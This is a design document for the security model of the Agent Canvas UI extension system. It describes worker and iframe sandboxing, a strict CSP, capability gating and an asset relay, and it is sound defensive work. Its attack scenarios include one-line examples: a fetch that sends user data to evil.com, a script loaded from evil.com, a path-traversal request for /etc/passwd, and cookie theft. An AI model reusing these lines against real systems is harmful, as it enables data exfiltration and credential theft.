# UI Extensions: Security Model

This document explains how Agent Canvas isolates and sandboxes UI extensions to protect users from malicious or compromised extension code.

---

## Security Principles

The extension system follows the **VS Code extension security model**:

1. **Zero trust** — Extensions are treated as untrusted code
2. **Least privilege** — Extensions get only the capabilities they explicitly request
3. **Defense in depth** — Multiple isolation layers prevent single-point failures
4. **User consent** — All capabilities require explicit user approval

---

## Isolation Layers

### Layer 1: Worker Sandbox (No DOM Access)

Extension background logic runs in a **Web Worker**, completely isolated from the host:

```
┌─────────────────────────────────────┐
│        Agent Canvas (Host)          │
│                                     │
│  ┌───────────────────────────────┐  │
│  │    User's DOM, Cookies,      │  │
│  │    Auth Tokens, Storage      │  │
│  └───────────────────────────────┘  │
│               ↕ RPC                 │
│  ┌───────────────────────────────┐  │
│  │      Web Worker               │  │
│  │  • No DOM access              │  │
│  │  • No window object           │  │
│  │  • No localStorage            │  │
│  │  • Only agentCanvas RPC API   │  │
│  └───────────────────────────────┘  │
└─────────────────────────────────────┘
```

**What this prevents:**
- Accessing or modifying the host DOM
- Reading cookies or auth tokens
- Accessing localStorage outside the extension's namespace
- Intercepting network requests
- Keylogging or clickjacking

**Worker capabilities:**
- Execute JavaScript
- Make RPC calls to the host (capability-gated)
- Import modules from the same extension
- Use standard Web APIs (but no DOM)

### Layer 2: Iframe Sandbox (No Same-Origin)

Extension webviews run in **sandboxed iframes** with restricted permissions:

```html
<iframe 
  sandbox="allow-scripts"
  src="blob:null/..."
></iframe>
```

**Sandbox restrictions:**
- **No same-origin access** — Iframe has an opaque origin (`null`), cannot access host's origin
- **No forms** — Cannot submit forms
- **No modals** — Cannot show alerts/confirms
- **No pointer lock** — Cannot capture cursor
- **No downloads** — Cannot trigger downloads

**What `allow-scripts` permits:**
- Run JavaScript (required for extension logic)

**What is still blocked:**
- Accessing parent window's DOM, cookies, or storage
- Making cross-origin network requests (blocked by CSP)
- Navigating the parent window

### Layer 3: Content Security Policy (No Network)

Extension webviews have a **strict CSP** that blocks network access:

```
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-{random}';
  style-src 'unsafe-inline';
  img-src blob: data:;
  connect-src 'none';
  frame-ancestors 'self';
```

**Key directives:**
- `default-src 'none'` — Block everything by default
- `script-src 'nonce-{random}'` — Only scripts with the correct nonce can execute
- `connect-src 'none'` — **No fetch/XHR/WebSocket** allowed
- `frame-ancestors 'self'` — Prevent embedding in external sites

**What this prevents:**
- Making HTTP requests (fetch, XHR)
- Opening WebSockets or EventSource
- Loading external scripts or stylesheets
- Sending data to external servers
- Beacon API exfiltration

**How extensions get data:**
- Via the `postMessage` RPC to the host
- Host mediates all network access (see Asset Relay)

### Layer 4: Capability Gating

Every privileged API call is gated by **capabilities** declared in the manifest:

```typescript
// Extension wants to read conversation
await agentCanvas.conversation.getActive();

// Host checks: Does this extension have "conversation:read"?
if (!grantedCapabilities.includes("conversation:read")) {
  throw new Error("Permission denied");
}

// Capability granted → proceed
return conversationService.getActive();
```

**Capability enforcement:**
- Checked on every API call
- No way to bypass (enforced in RPC layer)
- Capabilities cannot be requested at runtime (must be in manifest)
- Users see capabilities before installation

**Available capabilities:**

| Capability | Grants access to | Risk level |
|------------|------------------|------------|
| `conversation:read` | Active conversation metadata | Low — Read-only, no sensitive data |
| `storage` | Extension's own namespaced storage | Low — Isolated from host storage |

---

## Asset Relay Architecture

Extension webviews cannot make network requests directly (CSP blocks them). Instead, the **parent window acts as a privileged proxy** that fetches assets on behalf of the webview.

### Why Asset Relay?

GitHub extensions need to load assets (HTML, images, scripts) from GitHub, but:
1. Webview CSP blocks direct fetch
2. We don't want a backend proxy (deployment coupling)
3. We want parent-window visibility into all requests

**Solution:** VS Code-style postMessage relay

```
┌───────────────────────────────────────────────────────────────┐
│                       Parent Window (Host)                     │
│  ┌─────────────────────────────────────────────────────────┐  │
│  │              AssetLoader                                │  │
│  │  • Fetches from GitHub/CDN                              │  │
│  │  • No CSP restrictions                                  │  │
│  │  • Validates request against extension source           │  │
│  │  • Caches SHA-pinned assets                             │  │
│  └──────────────────┬──────────────────────────────────────┘  │
│                     │                                          │
│               postMessage                                      │
│                     │                                          │
│  ┌──────────────────▼──────────────────────────────────────┐  │
│  │            WebviewBridge                                │  │
│  │  • Receives asset requests                              │  │
│  │  • Routes to AssetLoader                                │  │
│  │  • Returns blob URLs or content                         │  │
│  └─────────────────────────────────────────────────────────┘  │
│                     │                                          │
└─────────────────────┼──────────────────────────────────────────┘
                      │
                postMessage
                      │
┌─────────────────────▼──────────────────────────────────────────┐
│                  Webview (sandboxed iframe)                     │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  CSP: connect-src 'none'                                │   │
│  │  • Cannot fetch() directly                              │   │
│  │  • Sends asset request via postMessage                  │   │
│  │  • Receives blob URL or content                         │   │
│  └─────────────────────────────────────────────────────────┘   │
└────────────────────────────────────────────────────────────────┘
```

### Security Properties

1. **Source validation:** AssetLoader only fetches from the extension's declared source
   - `gh:owner/repo/path@sha` → Can only load from that repo/path/SHA
   - `npm:package@version` → Can only load from that package/version

2. **Path traversal protection:** Requests for `../../../etc/passwd` are rejected

3. **Immutability:** SHA-pinned sources are cached indefinitely (content can't change)

4. **Parent visibility:** Every asset request goes through the parent (logged, auditable)

5. **No external access (yet):** Extensions cannot request arbitrary URLs
   - Future: Permission model for external service access

### Comparison: Backend Proxy vs. Asset Relay

| Security Property | Backend Proxy | Asset Relay (Current) |
|-------------------|---------------|-----------------------|
| Parent window visibility | ❌ No | ✅ Yes |
| Scoped per extension | ❌ Global endpoint | ✅ Per-iframe bridge |
| Source validation | ⚠️ Requires server-side logic | ✅ Enforced in parent |
| CSP compliance | ⚠️ Loosens webview CSP | ✅ Maintains strict CSP |
| Deployment | ❌ Requires backend changes | ✅ Frontend-only |

---

## Threat Model

### What Extensions CAN Do (By Design)

| Action | Risk | Mitigation |
|--------|------|------------|
| Display UI in webview | Low — Sandboxed | CSP prevents external resources |
| Read conversation metadata (with permission) | Low — Read-only | No sensitive data exposed |
| Store data (with permission) | Low — Namespaced | Isolated from host storage |
| Show host messages | Low — UI only | No data exfiltration |

### What Extensions CANNOT Do (Prevented by Sandbox)

| Attack Vector | Prevention |
|---------------|------------|
| Access cookies or auth tokens | Worker/iframe have no access to host origin |
| Read localStorage (except own namespace) | Namespaced storage API enforced by host |
| Make arbitrary network requests | CSP: `connect-src 'none'` blocks fetch/XHR/WebSocket |
| Exfiltrate data to external server | No network access, no form submission |
| Modify host DOM | Worker has no DOM; iframe sandbox blocks parent access |
| Keylogging | No access to host events, sandboxed origin |
| Clickjacking | Iframe cannot navigate parent |
| Load external scripts | CSP: `script-src 'nonce-{random}'` blocks external JS |
| Bypass CSP | Host sends authoritative CSP header (browser enforces) |
| Request capabilities at runtime | Capabilities must be declared in manifest |
| Escalate privileges | No API to request new capabilities post-install |

---

## Attack Scenarios and Mitigations

### Scenario 1: Malicious Extension Tries to Steal Auth Token

**Attack:** Extension tries to access `document.cookie` or `localStorage` to steal auth tokens.

**Mitigations:**
1. **Worker has no DOM access** — `document` is undefined in Web Workers
2. **Webview has opaque origin** — Sandbox prevents same-origin access
3. **Namespaced storage API** — `agentCanvas.storage` only accesses extension's namespace

**Result:** ❌ Attack fails (no access to host credentials)

### Scenario 2: Extension Tries to Exfiltrate Data via Network

**Attack:** Extension calls `fetch('https://evil.com', { method: 'POST', body: userData })`

**Mitigations:**
1. **CSP blocks fetch** — `connect-src 'none'` prevents all network requests
2. **No XMLHttpRequest** — Also blocked by CSP
3. **No WebSocket** — Blocked by CSP
4. **No form submission** — Iframe sandbox blocks forms

**Result:** ❌ Attack fails (no network access)

### Scenario 3: Extension Tries to Inject Script into Host

**Attack:** Extension tries to manipulate host DOM to inject `<script>` tags.

**Mitigations:**
1. **Worker has no DOM** — Cannot access `document`
2. **Iframe sandbox** — Cannot access `parent` or `top` window
3. **postMessage is the only channel** — Host validates all messages

**Result:** ❌ Attack fails (no DOM access)

### Scenario 4: Compromised Extension Updates to Request More Permissions

**Attack:** Extension version 1.0 requests no capabilities. Version 2.0 requests `conversation:read` and tries to auto-update.

**Mitigations:**
1. **Update consent required** — If new capabilities are requested, update is blocked
2. **User must re-install** — To grant new capabilities, user must go through consent flow again
3. **No auto-escalation** — Extensions cannot request capabilities at runtime

**Result:** ⚠️ User must explicitly approve new capabilities (safe by design)

### Scenario 5: Extension Loads Malicious External Script

**Attack:** Extension webview tries to load `<script src="https://evil.com/malware.js">`

**Mitigations:**
1. **CSP nonce enforcement** — Only scripts with `nonce="{random}"` can execute
2. **Nonce is server-generated** — Extension cannot guess the nonce
3. **External scripts blocked** — No `https://` sources allowed in `script-src`

**Result:** ❌ Attack fails (CSP blocks external scripts)

---

## Capability Consent Flow

Extensions request capabilities in their manifest. Users must explicitly approve:

```
┌─────────────────────────────────────────────────────────────┐
│  Install "My Extension"                                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  This extension requests the following permissions:         │
│                                                             │
│  ✓ Read the active conversation (conversation:read)        │
│    See the current conversation's title and metadata        │
│                                                             │
│  ✓ Store data on your device (storage)                     │
│    Keep its own data in your browser's local storage       │
│                                                             │
│  [ Cancel ]                         [ Install ]             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Consent properties:**
- **All-or-nothing** — User must approve all capabilities or cancel
- **Before installation** — Nothing is loaded until approval
- **Revocable** — User can uninstall the extension anytime
- **No runtime requests** — Extensions cannot request new capabilities post-install
- **Persistent** — Granted capabilities are saved with the extension install

---

## Trust Boundaries

```
┌────────────────────────────────────────────────────────────┐
│                    UNTRUSTED                               │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  Extension Code (Worker + Webview)                   │  │
│  │  • Third-party JavaScript                            │  │
│  │  • Could be malicious or compromised                 │  │
│  └──────────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────────┘
                            ↕
                       RPC + CSP
                            ↕
┌────────────────────────────────────────────────────────────┐
│                     TRUSTED                                │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  Agent Canvas Host                                   │  │
│  │  • Capability enforcement                            │  │
│  │  • Asset relay mediation                             │  │
│  │  • User credentials                                  │  │
│  └──────────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────────┘
```

**Key insight:** Extension code never leaves the UNTRUSTED zone. All privileged operations happen in the TRUSTED zone, mediated by capability checks.

---

## Remaining Risks and Mitigations

### Risk: Social Engineering

**Scenario:** User is tricked into installing a malicious extension that requests `conversation:read`.

**Mitigation:**
- Clear capability descriptions shown before install
- Users should only install extensions from trusted sources
- Versioned installs (`npm:`, `gh:`) are immutable (can't change after install)

**Responsibility:** User must exercise judgment

### Risk: Extension Bugs (Not Malicious)

**Scenario:** Poorly-written extension crashes or behaves incorrectly.

**Mitigation:**
- Extensions run in isolated contexts (won't crash host)
- Users can disable or uninstall misbehaving extensions
- Extension errors are logged separately (don't pollute host console)

**Impact:** Low (only affects that extension)

### Risk: Supply Chain Attack (npm/GitHub)

**Scenario:** Extension author's npm account or GitHub repo is compromised.

**Mitigation:**
- Installs are **pinned to SHA** (immutable)
- Updates require user action (no auto-updates)
- Users should verify source before installing
- **Future:** Content integrity verification (hashes)

**Impact:** Only affects users who explicitly update

---

## Future Enhancements

### 1. Permission Model for External Services

Allow extensions to request access to specific external origins:

```json
{
  "capabilities": ["fetch:https://api.example.com"]
}
```

**Security:**
- Origin-scoped (not global fetch access)
- User consent required
- AssetLoader validates origin against manifest

### 2. Private GitHub Repository Support

Allow extensions from private repos:

```json
{
  "githubToken": "ghp_..."
}
```

**Security:**
- Token stored securely in user's browser
- Only used for declared extension sources
- Never sent to extension code

### 3. Content Integrity Verification

Verify extension code hasn't been tampered with:

```json
{
  "integrity": {
    "main.js": "sha256-...",
    "panel.html": "sha256-..."
  }
}
```

**Security:**
- Host verifies hashes before execution
- Prevents MITM attacks
- Ensures immutability

### 4. Extension Marketplace Review

Curated marketplace with security review:

- Manual review of requested capabilities
- Automated static analysis
- Code signing
- Reputation system

---

## Security Auditing

**For developers:**
- All RPC calls are logged (DevTools console)
- Webview CSP violations are logged
- Capability checks are auditable in `host/host-api.ts`

**For users:**
- Installed extensions are visible at `/extensions`
- Capabilities are shown on extension cards
- Source is visible (npm, gh, or URL)

**For operators:**
- Extension installs are stored in `localStorage` (inspectable)
- No server-side extension execution (all client-side)

---

## Comparison to Other Extension Systems

### VS Code

**Similarities:**
- Declarative manifest with contribution points
- Capability-gated API
- Webviews for custom UI
- postMessage for webview communication

**Differences:**
- VS Code: Extensions run in Node.js (more privileged)
- Agent Canvas: Extensions run in Web Workers (more restricted)
- VS Code: Extensions can access filesystem, spawn processes
- Agent Canvas: Extensions have no filesystem or process access

### Browser Extensions (Chrome/Firefox)

**Similarities:**
- Sandboxed execution
- Permission model

**Differences:**
- Browser extensions: Can inject content scripts, modify web pages
- Agent Canvas: No content script injection, isolated to Agent Canvas only
- Browser extensions: Broad network access (if requested)
- Agent Canvas: No network access (asset relay only)

### Claude Code Plugins

**Similarities:**
- Declarative manifest
- Plugin marketplace

**Differences:**
- Claude Code: Server-side plugin execution
- Agent Canvas: Client-side only (no server impact)
- Claude Code: Plugins are agent tools/skills
- Agent Canvas: Extensions are UI enhancements

---

## Summary

Agent Canvas UI extensions use **defense-in-depth** to protect users:

1. ✅ **Worker sandbox** — No DOM access
2. ✅ **Iframe sandbox** — No same-origin access
3. ✅ **Strict CSP** — No network access
4. ✅ **Capability gating** — Least-privilege API
5. ✅ **Asset relay** — Parent mediates all asset loading
6. ✅ **User consent** — Explicit approval required
7. ✅ **Immutable installs** — SHA-pinned sources

**No single layer is perfect, but together they create a robust security boundary.**

Users should still exercise judgment when installing extensions, but the system is designed to minimize the impact of malicious code.
